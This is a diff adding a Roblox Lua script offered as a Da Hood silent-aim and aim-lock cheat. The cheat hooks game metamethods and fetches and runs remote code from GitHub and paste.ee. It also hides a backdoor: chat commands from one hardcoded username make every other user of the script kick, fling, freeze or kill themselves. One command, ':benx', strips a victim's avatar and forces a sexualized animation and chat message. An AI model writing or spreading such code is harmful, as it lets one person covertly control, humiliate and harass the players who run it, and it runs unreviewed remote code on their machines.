@@ -1,0 +1,241 @@
+if disable then disable() end
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() and Players.LocalPlayer
+local connections = {}
+local SayMessageRequest
+local commands
+local cmdlist
+
+local function getchar(plr)
+   if not plr then plr = lp end
+   return plr.Character or plr.CharacterAdded:Wait()
+end
+
+local function gethumanoid(plr)
+   if not plr then plr = lp end
+   return getchar(plr):WaitForChild("Humanoid")
+end
+
+local function getroot(plr)
+   if not plr then plr = lp end
+   local humanoid = gethumanoid(plr)
+   repeat task.wait() until humanoid.RootPart
+   return humanoid.RootPart
+end
+
+local function say(...)
+   if not SayMessageRequest then
+       SayMessageRequest = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+   end
+   SayMessageRequest:FireServer(tostring(...),"All")
+end
+
+local mod = game.Players.leavemelikeimdeadd -- Replace with your username
+
+-- Commands --
+local freeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+end
+
+local unfreeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = false
+end
+
+mod.Chatted:connect(function(cht)
+	if cht:match(":kick .") then
+		if game.Players.LocalPlayer ~= mod then
+			game.Players.LocalPlayer:Kick("hurensohn") -- Change to Whatever (kick msg)
+		end
+	end
+
+end)
+
+mod.Chatted:connect(function(cht)
+	if cht:match(":fling .") then
+		if game.Players.LocalPlayer ~= mod then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+			local power = 99999 -- change this to make it more or less powerful
+
+			game:GetService('RunService').Stepped:connect(function()
+				game.Players.LocalPlayer.Character.Head.CanCollide = false
+				game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+				game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+			end)
+			wait(.1)
+			local bambam = Instance.new("BodyThrust")
+			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+			bambam.Force = Vector3.new(power,0,power)
+			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		end
+	end
+
+end)
+
+mod.Chatted:connect(function(cht)
+	if cht:match(":benx .") then -- ↓ Change "no please" to anything you want them to say when benx is used
+		if game.Players.LocalPlayer ~= mod then
+			wait(0) local A_1 = "no please" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = mod.Character.HumanoidRootPart
+			local benxed = true
+			while benxed == true do
+				local hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+				pcall(function()
+					hummy.Parent.Pants:Destroy()
+				end)
+				pcall(function()
+					hummy.Parent.Shirt:Destroy()
+				end)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mod.Character.HumanoidRootPart.CFrame + mod.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+				wait(0.1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+			end
+		end
+	end
+
+end)
+
+mod.Chatted:connect(function(cht)
+	if cht:match(":freeze .") then
+		if game.Players.LocalPlayer ~= mod then
+			freeze()
+		end
+	end
+
+end)
+
+mod.Chatted:connect(function(cht)
+	if cht:match(":unfreeze .") then
+		if game.Players.LocalPlayer ~= mod then
+			unfreeze()
+		end
+	end
+
+end)
+
+mod.Chatted:connect(function(cht)
+	if cht:match(":ban .") then
+		if game.Players.LocalPlayer ~= mod then
+			game.Players.LocalPlayer:kick("PERMA BAN")
+		end
+	end
+
+end)
+
+mod.Chatted:connect(function(cht)
+	if cht:match(":kill .") then
+		if game.Players.LocalPlayer ~= mod then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		end
+	end
+
+end)
+
+mod.Chatted:connect(function(cht)
+	if cht:match(":bring .") then
+		if game.Players.LocalPlayer ~= mod then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(mod.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+
+local player = game.Players.LocalPlayer
+
+if player:IsInGroup(4388652) then
+local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/D11voqiiIsDaddy/Streamable-Silent/main/Side"))()
+Aiming.TeamCheck(false)
+
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local CurrentCamera = Workspace.CurrentCamera
+
+local DaHoodSettings = {
+    SilentAim = true,
+    AimLock = false,
+    Prediction = 0.11243,
+    AimLockKeybind = Enum.KeyCode.E
+}
+getgenv().DaHoodSettings = DaHoodSettings
+
+function Aiming.Check()
+    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
+        return false
+    end
+
+    local Character = Aiming.Character(Aiming.Selected)
+    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
+    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+
+    if (KOd or Grabbed) then
+        return false
+    end
+
+    return true
+end
+
+local __index
+__index = hookmetamethod(game, "__index", function(t, k)
+    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
+        local SelectedPart = Aiming.SelectedPart
+
+        if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
+            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+
+            return (k == "Hit" and Hit or SelectedPart)
+        end
+    end
+
+    return __index(t, k)
+end)
+
+
+
+
+RunService:BindToRenderStep("AimLock", 0, function()
+    if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
+        local SelectedPart = Aiming.SelectedPart
+
+        local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+
+        CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
+    end
+    end)
+
+
+    local player = game.Players.LocalPlayer
+    local mouse = player:GetMouse()
+    mouse.KeyDown:Connect(function(key)
+    
+        if key == "x" then
+                
+        
+        
+            if DaHoodSettings.SilentAim == false then
+                
+            DaHoodSettings.SilentAim = true
+                
+            else
+                    
+            DaHoodSettings.SilentAim = false
+        
+            end
+        end
+    end)
+    wait(1)
+    loadstring(game:HttpGet("https://paste.ee/r/DstYB"))()
+        
+    else
+setclipboard("https://www.roblox.com/groups/4388652/hashtags-squad#!/about")
+wait(1)
+game.Players.LocalPlayer:Kick("Join the group to use the script, the link was copied to your clipboard!")
+        end
